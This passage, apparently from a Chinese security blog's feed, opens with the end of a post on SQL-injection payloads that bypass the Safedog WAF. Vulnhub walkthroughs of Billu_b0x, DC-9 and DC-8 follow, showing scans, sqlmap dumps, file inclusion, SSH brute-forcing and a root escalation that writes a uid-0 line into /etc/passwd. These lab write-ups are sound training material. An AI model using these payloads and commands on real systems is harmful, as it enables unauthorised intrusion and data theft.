<h5 id="使用-amp-amp-替换and"><a href="#使用-amp-amp-替换and" class="headerlink" title="使用&amp;&amp;替换and"></a>使用<code>&amp;&amp;</code>替换and</h5><p><img src="/posts/d405928/3.png"><br>无法绕过</p>
<h5 id="使用内联注释-！11440"><a href="#使用内联注释-！11440" class="headerlink" title="使用内联注释/*！11440 */"></a>使用内联注释<code>/*！11440 */</code></h5><p><img src="/posts/d405928/4.png"></p>
<p><img src="/posts/d405928/8.png"><br>可以绕过<br><br></p>
<h5 id="继续使用and"><a href="#继续使用and" class="headerlink" title="继续使用and"></a>继续使用and</h5><p>and 0x1</p>
<p>可以使用十六进制绕过</p>
<br>
##### http参数污染

<p><img src="/posts/d405928/14.png"><br><br></p>
<hr>
<br>

<br>

<h4 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h4><h5 id="使用换行符和注释绕过"><a href="#使用换行符和注释绕过" class="headerlink" title="使用换行符和注释绕过"></a>使用换行符和注释绕过</h5><p><code>?name=tom&#39;/**/order/*/%0A*/by/**/3%23</code></p>
<p><img src="/posts/d405928/6.png"><br><img src="/posts/d405928/7.png"></p>
<h5 id="使用http参数污染"><a href="#使用http参数污染" class="headerlink" title="使用http参数污染"></a>使用http参数污染</h5><p><code>name=tom1&#39; /*&amp;name=tom&#39; order by 3%23*/</code><br><img src="http1.png"><br><img src="http2.png"></p>
<br>

<hr>
<h4 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h4><h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><p>尝试使用<code>?id=tom&#39; union/*!11440select*/ 1,2,3 --+</code></p>
<p>fuzz跑了下10000-99999都无法绕过</p>
<p><img src="/posts/d405928/5.png"></p>
<br>

<h5 id="换行符-注释"><a href="#换行符-注释" class="headerlink" title="换行符+注释"></a>换行符+注释</h5><p><img src="/posts/d405928/9.png"></p>
<p>无法绕过</p>
<br>

<h5 id="内联注释-换行符"><a href="#内联注释-换行符" class="headerlink" title="内联注释+换行符"></a>内联注释+换行符</h5><p><img src="/posts/d405928/10.png"></p>
<p><code>tom%27/**/union/*!§10440§asd*//*!%0a*/select/**/1,2,3%20--+</code></p>
<p>fuzz一下，发现91625以后的都可以绕过</p>
<p><img src="/posts/d405928/11.png"></p>
<p><img src="/posts/d405928/12.png"></p>
<h5 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,2,3%23*/</code></p>
<p><img src="http3.png"></p>
<p><img src="http4.png"></p>
<br>

<hr>
<h5 id="database-、user-绕过"><a href="#database-、user-绕过" class="headerlink" title="database()、user()绕过"></a>database()、user()绕过</h5><p><code>databse/*!91624*/()`` </code>user/!<em>99999</em>/()``</p>
<br>

<p>这里也可以通过内联注释 中间数字没试 随便输入了几个</p>
<p><img src="/posts/d405928/13.png"></p>
<br>

<hr>
<h4 id="information-schema绕过"><a href="#information-schema绕过" class="headerlink" title="information_schema绕过"></a>information_schema绕过</h4><h5 id="使用内联注释-fuzz"><a href="#使用内联注释-fuzz" class="headerlink" title="使用内联注释+fuzz"></a>使用内联注释+fuzz</h5><p>没绕过</p>
<h5 id="利用http参数污染"><a href="#利用http参数污染" class="headerlink" title="利用http参数污染"></a>利用http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),user()%23*/</code></p>
<p><img src="http5.png"></p>
<br>

<hr>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="内联注释-fuzz"><a href="#内联注释-fuzz" class="headerlink" title="内联注释+fuzz"></a>内联注释+fuzz</h5><p>updatexml</p>
<p>无waf情况下</p>
<p><img src="/posts/d405928/baocuo1.png"></p>
<p>开启安全狗</p>
<p><img src="/posts/d405928/baocuo2.png"></p>
<p>updataxml()会被拦截，中间加内联注释可以绕过</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select database/*!99999*/()),0x7e),1) --+</code></p>
<p><img src="/posts/d405928/baocuo3.png"></p>
<p>但是</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select/*!99999aaa*/database/*!99999*/()),0x7e),1) --+</code>会被拦截</p>
<p>测试了下 <code>select from ...</code> 后面加东西就会被拦截</p>
<p>在from 后面添加 <code>%23%0a</code>可以绕过</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select name from%23%0A%20 test ),0x7e),1) --+</code></p>
<p><img src="/posts/d405928/baocuo4.png"></p>
<br>

<h5 id="http参数污染-1"><a href="#http参数污染-1" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)%23*/</code></p>
<p><img src="http6.png"></p>
<p><img src="http7.png"></p>
<br>

<hr>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="http参数污染-2"><a href="#http参数污染-2" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><img src="http_sleep.png"></p>
<p><img src="/posts/d405928/bool1.png"> </p>
<p><img src="/posts/d405928/bool2.png"></p>
<br>

<br>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在此版本的安全狗(4.0.23.13)中，利用<strong>http参数污染</strong>都可以绕过</p>
<p>有些也可以使用<strong>内联注释</strong>+<strong>fuzz</strong>+<strong>换行符</strong>进行绕过</p>
]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs1</title>
    <url>/posts/685229a3/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Billu_b0x</title>
    <url>/posts/827ecdf7/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
<p>网段        192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>靶机        192.168.18.144</p>
</blockquote>
<h4 id="nmap扫网段"><a href="#nmap扫网段" class="headerlink" title="nmap扫网段"></a>nmap扫网段</h4><p><code>sudo nmap 192.168.18.0/24 -sP</code></p>
<blockquote>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 19:58 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.000079s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.144<br>Host is up (0.00054s latency).<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.25 seconds</p>
</blockquote>
<h4 id="nmap扫端口"><a href="#nmap扫端口" class="headerlink" title="nmap扫端口"></a>nmap扫端口</h4><p><code>sudo nmap 192.168.18.144 -p- -sV</code></p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.144 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 20:00 CST<br>Nmap scan report for 192.168.18.144<br>Host is up (0.0012s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds</p>
</blockquote>
<p>开放了22端口和80端口</p>
<h4 id="dirsearch扫描目录"><a href="#dirsearch扫描目录" class="headerlink" title="dirsearch扫描目录"></a>dirsearch扫描目录</h4><p><code>sudo python3 dirsearch.py -u 192.168.18.144</code></p>
<blockquote>
<p>[20:25:23] 200 -  307B  - /add<br>[20:25:23] 200 -  307B  - /add.php<br>[20:25:25] 200 -    1B  - /c<br>[20:25:25] 403 -  290B  - /cgi-bin/<br>[20:25:27] 403 -  286B  - /doc/<br>[20:25:27] 403 -  301B  - /doc/en/changes.html<br>[20:25:27] 403 -  290B  - /doc/api/<br>[20:25:27] 403 -  300B  - /doc/stable.version<br>[20:25:27] 200 -    3KB - /head.php<br>[20:25:28] 200 -    1KB - /images/<br>[20:25:28] 301 -  317B  - /images  -&gt;  <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a><br>[20:25:28] 200 -   47KB - /in<br>[20:25:28] 200 -    3KB - /index<br>[20:25:28] 200 -    3KB - /index.php </p>
<p>[20:25:29] 302 -    2KB - /panel  -&gt;  index.php<br>[20:25:29] 302 -    2KB - /panel.php  -&gt;  index.php<br>[20:25:30] 200 -    8KB - /phpmy/<br>[20:25:31] 403 -  296B  - /server-status/<br>[20:25:31] 403 -  295B  - /server-status<br>[20:25:31] 200 -    1B  - /show<br>[20:25:32] 200 -   72B  - /test<br>[20:25:32] 200 -   72B  - /test.php    </p>
</blockquote>
<p>扫出</p>
<p><code>add.php</code>     文件上传</p>
<p><img src="/posts/827ecdf7/add.png"></p>
<p><code>head.php</code> 貌似没啥东西 就一背景图</p>
<p><img src="/posts/827ecdf7/head.png"></p>
<p><code>test.php</code> 文件包含</p>
<p><img src="/posts/827ecdf7/test.png"></p>
<p><code>phpmy</code>        phpmyadmin登录页面</p>
<p><img src="/posts/827ecdf7/phpmy.png"></p>
<p><code>in</code>            phpinfo()</p>
<p><img src="/posts/827ecdf7/phpinfo.png"></p>
<blockquote>
<p>allow_url_fopen    On<br>allow_url_include    Off<br>mysql版本为5.5.38</p>
</blockquote>
<h4 id="用dirb扫描目录"><a href="#用dirb扫描目录" class="headerlink" title="用dirb扫描目录"></a>用dirb扫描目录</h4><blockquote>
<p> —- Scanning URL: <a href="http://192.168.18.144/">http://192.168.18.144/</a> —-</p>
<ul>
<li><a href="http://192.168.18.144/add">http://192.168.18.144/add</a> (CODE:200|SIZE:307)                                                          </li>
<li><a href="http://192.168.18.144/c">http://192.168.18.144/c</a> (CODE:200|SIZE:1)                                                              </li>
<li><a href="http://192.168.18.144/cgi-bin/">http://192.168.18.144/cgi-bin/</a> (CODE:403|SIZE:290)                                                     </li>
<li><a href="http://192.168.18.144/head">http://192.168.18.144/head</a> (CODE:200|SIZE:2793)<br>==&gt; DIRECTORY: <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a>                                                             </li>
<li><a href="http://192.168.18.144/in">http://192.168.18.144/in</a> (CODE:200|SIZE:47554)                                                         </li>
<li><a href="http://192.168.18.144/index">http://192.168.18.144/index</a> (CODE:200|SIZE:3267)                                                       </li>
<li><a href="http://192.168.18.144/index.php">http://192.168.18.144/index.php</a> (CODE:200|SIZE:3267)                                                   </li>
<li><a href="http://192.168.18.144/panel">http://192.168.18.144/panel</a> (CODE:302|SIZE:2469)                                                       </li>
<li><a href="http://192.168.18.144/server-status">http://192.168.18.144/server-status</a> (CODE:403|SIZE:295)                                                </li>
<li><a href="http://192.168.18.144/show">http://192.168.18.144/show</a> (CODE:200|SIZE:1)                                                           </li>
<li><a href="http://192.168.18.144/test">http://192.168.18.144/test</a> (CODE:200|SIZE:72)                                                          </li>
</ul>
</blockquote>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>进入主页，有一个登录框，并提示sql注入</p>
<p><img src="/posts/827ecdf7/index.png"></p>
<p>尝试下sql注入，用sqlmap跑一下</p>
<p><code>sqlmap -u &#39;http://192.168.18.144/&#39;  --method POST --data &#39;un=admin&amp;os=admin&amp;login=let%27s+login&#39; --batch --dbms mysql </code></p>
<p>没扫出来注入点</p>
<br>

<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>传一个图片马试试，或许后面会用到</p>
<br>

<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>在<code>test.php</code>get请求 传参 <code>?file=/etc/passwd</code>没反应</p>
<p>使用post传参<code>file=/etc/passwd</code>会弹出一个下载文件窗口</p>
<p>文件内容为<code>/etc/passwd</code>的输出内容</p>
<p>使用burp抓包，把get包改为post包</p>
<p><img src="/posts/827ecdf7/file_include1.png"></p>
<blockquote>
<p>ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</p>
</blockquote>
<p>发现一个<code>ica</code>的用户，可以登录ssh</p>
<br>


<p>同时用这种方法去下载<code>add.php</code>,<code>in.php</code> <code>index.php</code> <code>test.php</code> <code>show.php</code> <code>c.php</code></p>
<p><img src="/posts/827ecdf7/addphp.png"><br>在add.php中有文件上传的代码，没有经过任何处理，可以考虑去上传图片马在in.php中是phpinfo信息</p>
<h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h5><p><img src="/posts/827ecdf7/cphp.png"><br>在c.php中发现了mysql数据库的账户信息<code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p>
<blockquote>
<p>用户名 billu密码 b0x_billu数据库名 ica_lab</p>
</blockquote>
<p>使用这个账户去尝试登录phpmyadmin，成功登录,并得到phpmyadmin版本为3.4.7登录后台思路一 使用phpmyadmin中账号<br><img src="/posts/827ecdf7/auth.png"><br>在anth表中得到一个账户 biLLu hEx_it使用此账户成功登录到后台</p>
<h5 id="思路二-SQL注入再尝试查看index-php的源码"><a href="#思路二-SQL注入再尝试查看index-php的源码" class="headerlink" title="思路二 SQL注入再尝试查看index.php的源码"></a>思路二 SQL注入再尝试查看index.php的源码</h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>前面使用str_replace 将单引号全部过滤掉了，<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>输入<code>pass=admin\   uname= or 1=1 --+</code><br>即 <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>成功登录文件上传<br><img src="/posts/827ecdf7/login.png"><br>审计一下panel.php<br>页面有两个功能 show users 和 add users 对于文件上传使用了白名单机制，只允许上传<code>jpeg,jpg,gif,png</code><br>当要上传一张图片是，会先判断后缀名是否正确，如果正确，还有一个mime验证<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>可以看到上传图片的路径为uploaded_images/</p>
<p>这里传马多次都没传成功，有时间再试试吧….</p>
<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#56;&#x2e;&#x31;&#x34;&#52;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#56;&#x2e;&#x31;&#x34;&#52;</a>成功登录root用户</p>
<p>Reference</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>vulhub</category>
      </categories>
      <tags>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges9</title>
    <url>/posts/73305909/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
<p>网段     192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>靶机    192.168.18.142</p>
</blockquote>
<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-10 20:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00039s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.142<br>Host is up (0.00043s latency).<br>MAC Address: 00:0C:29:C2:75:62 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00018s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.12 seconds</p>
</blockquote>
<h4 id="扫描靶机端口"><a href="#扫描靶机端口" class="headerlink" title="扫描靶机端口"></a>扫描靶机端口</h4><blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.142 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-10 20:35 CST<br>Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 93.02% done; ETC: 20:36 (0:00:00 remaining)<br>Nmap scan report for 192.168.18.142<br>Host is up (0.0014s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE    SERVICE VERSION<br>22/tcp filtered ssh<br>80/tcp open     http    Apache httpd 2.4.38 ((Debian))<br>MAC Address: 00:0C:29:C2:75:62 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds<br>kali@kali2020:~$ </p>
</blockquote>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>发现一个搜索框和登录框，看下是否存在sql注入</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot; --dbs --batch</code></p>
<p>得到三个数据库</p>
<blockquote>
<p>available databases [3]:<br>[*] information_schema<br>[*] Staff<br>[*] users</p>
</blockquote>
<p><code> sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users --tables</code></p>
<blockquote>
<p>Database: users<br>[1 table]<br>+————-+<br>| UserDetails |<br>+————-+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails --columns</code></p>
<blockquote>
<p>Database: users<br>Table: UserDetails<br>[6 columns]<br>+———–+—————–+<br>| Column    | Type            |<br>+———–+—————–+<br>| firstname | varchar(30)     |<br>| id        | int(6) unsigned |<br>| lastname  | varchar(30)     |<br>| password  | varchar(20)     |<br>| reg_date  | timestamp       |<br>| username  | varchar(30)     |<br>+———–+—————–+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails -C username,password --dump</code>结果发现这是display页面的信息换另一个表跑一下</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff --tables</code></p>
<blockquote>
<p>Database: Staff<br>[2 tables]<br>+————–+<br>| StaffDetails |<br>| Users        |<br>+————–+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff -T Users --column</code></p>
<blockquote>
<p>Database: Staff<br>Table: Users<br>[3 columns]<br>+———-+—————–+<br>| Column   | Type            |<br>+———-+—————–+<br>| Password | varchar(255)    |<br>| UserID   | int(6) unsigned |<br>| Username | varchar(255)    |</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff -T Users -C Username,Password  --dump</code></p>
<blockquote>
<p>Database: Staff<br>Table: Users<br>[1 entry]<br>+———-+———————————-+<br>| Username | Password                         |<br>+———-+———————————-+<br>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |<br>+———-+———————————-+</p>
</blockquote>
<p>跑出<code>admin</code> <code>856f5de590ef37314e7c3bdf6f8a66dc</code></p>
<p>md5解出来<code>transorbital1</code></p>
<p>跑出另一个数据库的数据</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails -C username,password --dump</code></p>
<blockquote>
<p>Database: users<br>Table: UserDetails<br>[17 entries]<br>+———–+—————+<br>| username  | password      |<br>+———–+—————+<br>| marym     | 3kfs86sfd     |<br>| julied    | 468sfdfsd2    |<br>| fredf     | 4sfd87sfd1    |<br>| barneyr   | RocksOff      |<br>| tomc      | TC&amp;TheBoyz    |<br>| jerrym    | B8m#48sd      |<br>| wilmaf    | Pebbles       |<br>| bettyr    | BamBam01      |<br>| chandlerb | UrAG0D!       |<br>| joeyt     | Passw0rd      |<br>| rachelg   | yN72#dsd      |<br>| rossg     | ILoveRachel   |<br>| monicag   | 3248dsds7s    |<br>| phoebeb   | smellycats    |<br>| scoots    | YR3BVxxxw87   |<br>| janitor   | Ilovepeepee   |<br>| janitor2  | Hawaii-Five-0 |<br>+———–+—————+</p>
</blockquote>
<p>去<code>manage.php</code>登录下试试,成功登录</p>
<p>页面左下角有一个<code> File does not exist</code>推测有本地文件包含漏洞</p>
<p><img src="/posts/73305909/file_include_etcpasswd.png"></p>
<p><img src="/posts/73305909/Wappalyzer.png"></p>
<p>使用的apache</p>
<p><img src="/posts/73305909/apache.png"></p>
<p>用burp 爆破了下LFI字典 没发现有用的信息</p>
<p><img src="/posts/73305909/intruder.png"></p>
<p>去试试之前跑出来的用户账号能不能ssh登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># username</span><br><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#passwd</span><br><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m#48sd</span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72#dsd</span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br></pre></td></tr></table></figure>

<p><img src="/posts/73305909/ssh_connect_error.png"></p>
<p>发现全是连接失败，但是nmap扫描端口的时候22端口是开放的</p>
<p>网上搜了下，这是使用的<strong>knock服务(端口敲门服务)</strong> </p>
<h3 id="knock服务"><a href="#knock服务" class="headerlink" title="knock服务"></a>knock服务</h3><p>Knockd的配置文件路径为<code>/etc/knockd.conf</code></p>
<p><img src="/posts/73305909/knockd_conf.png"></p>
<p>开放了<code>7469</code>,<code>8475</code>,<code>9842</code>三个端口</p>
<p>在默认情况下，22端口是关闭的，只有访问了以上三个端口后，22端口才会开放。</p>
<p>使用nmap访问以上三个端口</p>
<p>访问后在去连接ssh，ssh端口可以访问</p>
<p><img src="/posts/73305909/ssh_connect.png"></p>
<p><img src="/posts/73305909/hydra1.png"></p>
<p>最后试出了三组可以ssh登录的账号</p>
<blockquote>
<p>chandlerb   UrAG0D!<br>joeyt       Passw0rd<br>janitor     Ilovepeepee</p>
</blockquote>
<p><img src="/posts/73305909/ssh1.png"></p>
<p>在<code>janitor</code>用户下发现一个隐藏文件夹，里面包含一个密码本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># passwords-found-on-post-it-notes.txt </span><br><span class="line"></span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>

<p><img src="/posts/73305909/hydra2.png"></p>
<p>跑出了一个账号</p>
<p><code>fredf</code> <code>B4-Tru3-001</code></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/posts/73305909/fredf_sudo.png"></p>
<p>不需要密码可以执行<code>/opt/devstuff/dist/test/test</code></p>
<p><img src="/posts/73305909/testpy.png"></p>
<p>提示test是个py文件</p>
<p>找一下test.py</p>
<p><code>find / -name &quot;test.py&quot; 2&gt;/dev/null</code></p>
<p><img src="/posts/73305909/find_test.png"></p>
<p>发现两个文件</p>
<blockquote>
<p>/opt/devstuff/test.py<br>/usr/lib/python3/dist-packages/setuptools/command/test.py</p>
</blockquote>
<p>估计只有第一个可以用得上</p>
<p><code>cat /opt/devstuff/test.py</code></p>
<p><img src="/posts/73305909/testpy1.png"></p>
<p>需要两个参数，把第一个参数的内容追加到第二个文件中</p>
<p>使用openssl创建一个用户</p>
<p><code> openssl  passwd -1 -salt Mamor 123456</code><br><code>$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/</code></p>
<p>构造一个用户</p>
<p><code>Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash</code></p>
<p>echo “Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash” &gt; /tmp/mamor</p>
<p>sudo ./test /tmp/mamor /etc/passswd</p>
<p>构造失败没法写入</p>
<p><code>cat  /tmp/mamor </code></p>
<p><img src="/posts/73305909/usercreate_error.png"></p>
<p>发现写入的数据并不是原数据</p>
<p>换<code>&#39;</code>试试</p>
<p><code>echo &#39;Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash&#39; &gt; /tmp/mamor1</code></p>
<p><img src="/posts/73305909/usercreate.png"></p>
<p>还是没法写入</p>
<p><code>openssl passwd -1 -salt test test</code></p>
<blockquote>
<p>$1$test$pi/xDtU5WFVRqYS6BMU8X/</p>
</blockquote>
<p><code>echo &#39;test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash&#39; &gt;&gt; /tmp/testtest</code></p>
<p><code>sudo ./test /tmp/testtest /etc/passwd</code></p>
<p><code>cat /etc/passwd</code></p>
<blockquote>
<p>test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash</p>
</blockquote>
<p>这次写入成功</p>
<p><img src="/posts/73305909/flag.png"></p>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges8</title>
    <url>/posts/437699f/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
<p>网段     192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>靶机        192.168.18.141</p>
</blockquote>
<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.141<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00032s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
</blockquote>
<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
